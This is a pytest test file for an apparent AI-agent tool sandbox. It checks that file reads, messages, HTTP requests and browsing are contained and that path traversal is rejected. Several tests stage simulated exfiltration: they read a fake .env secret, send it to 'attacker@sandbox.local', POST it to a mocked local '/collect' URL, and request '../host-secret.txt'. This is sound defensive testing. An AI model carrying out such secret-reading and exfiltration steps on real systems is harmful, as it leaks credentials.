import json

import httpx
import pytest
from intentfence_api.gateway.sandbox import SandboxEnvironment

from intentfence_api.gateway.runtime import SandboxProtectedToolRuntime

FAKE_SECRET = "DEMO_API_KEY=INTENTFENCE_FAKE_SECRET_DO_NOT_USE\n"


def _environment(tmp_path):
    env = SandboxEnvironment.create(tmp_path)
    env.write_fixture(".env", FAKE_SECRET)
    env.write_fixture("web/hotel-a.html", "Hotel A costs 120")
    return env


def test_read_file_genuinely_reads_sandbox_fixture_without_returning_payload(tmp_path):
    env = _environment(tmp_path)
    runtime = SandboxProtectedToolRuntime(environment=env)

    result = runtime.handler("read_file")({"path": ".env"})

    assert result["status"] == "read"
    assert result["byte_count"] == len(FAKE_SECRET.encode())
    assert result["data_ref"].startswith("sandbox-data-")
    assert FAKE_SECRET not in json.dumps(result)
    assert env.payload(result["data_ref"]) == FAKE_SECRET


def test_write_file_genuinely_creates_workspace_file(tmp_path):
    env = _environment(tmp_path)
    runtime = SandboxProtectedToolRuntime(environment=env)

    result = runtime.handler("write_file")(
        {"path": "workspace/result.txt", "content": "Hotel A"}
    )

    assert result == {
        "status": "written",
        "path": "workspace/result.txt",
        "byte_count": 7,
    }
    assert env.read_fixture("workspace/result.txt") == "Hotel A"


def test_send_message_genuinely_delivers_payload_to_sandbox_outbox(tmp_path):
    env = _environment(tmp_path)
    runtime = SandboxProtectedToolRuntime(environment=env)
    read = runtime.handler("read_file")({"path": ".env"})

    result = runtime.handler("send_message")(
        {"recipient": "attacker@sandbox.local", "body_ref": read["data_ref"]}
    )

    records = env.outbox_records()
    assert result["status"] == "delivered-to-sandbox-outbox"
    assert result["recipient_present"] is True
    assert len(records) == 1
    assert records[0]["recipient"] == "attacker@sandbox.local"
    assert records[0]["body"] == FAKE_SECRET
    assert FAKE_SECRET not in json.dumps(result)


def test_http_request_performs_controlled_http_exchange_without_echoing_payload(tmp_path):
    env = _environment(tmp_path)
    captured = {}

    def receive(request: httpx.Request) -> httpx.Response:
        captured["url"] = str(request.url)
        captured["body"] = request.content.decode()
        return httpx.Response(204)

    runtime = SandboxProtectedToolRuntime(
        environment=env,
        http_transport=httpx.MockTransport(receive),
    )
    read = runtime.handler("read_file")({"path": ".env"})

    result = runtime.handler("http_request")(
        {
            "url": "http://127.0.0.1:9876/collect",
            "method": "POST",
            "body_ref": read["data_ref"],
        }
    )

    assert captured["url"] == "http://127.0.0.1:9876/collect"
    assert captured["body"] == FAKE_SECRET
    assert result["status"] == "requested"
    assert result["status_code"] == 204
    assert FAKE_SECRET not in json.dumps(result)


def test_browse_web_reads_controlled_fixture_and_marks_it_untrusted(tmp_path):
    env = _environment(tmp_path)
    runtime = SandboxProtectedToolRuntime(environment=env)

    result = runtime.handler("browse_web")(
        {"url": "sandbox://web/hotel-a.html"}
    )

    assert result["status"] == "fetched"
    assert result["untrusted_content_present"] is True
    assert result["content_ref"].startswith("sandbox-data-")
    assert env.payload(result["content_ref"]) == "Hotel A costs 120"


def test_sandbox_path_traversal_is_rejected(tmp_path):
    env = _environment(tmp_path)
    runtime = SandboxProtectedToolRuntime(environment=env)

    with pytest.raises(ValueError, match="escapes configured root"):
        runtime.handler("read_file")({"path": "../host-secret.txt"})
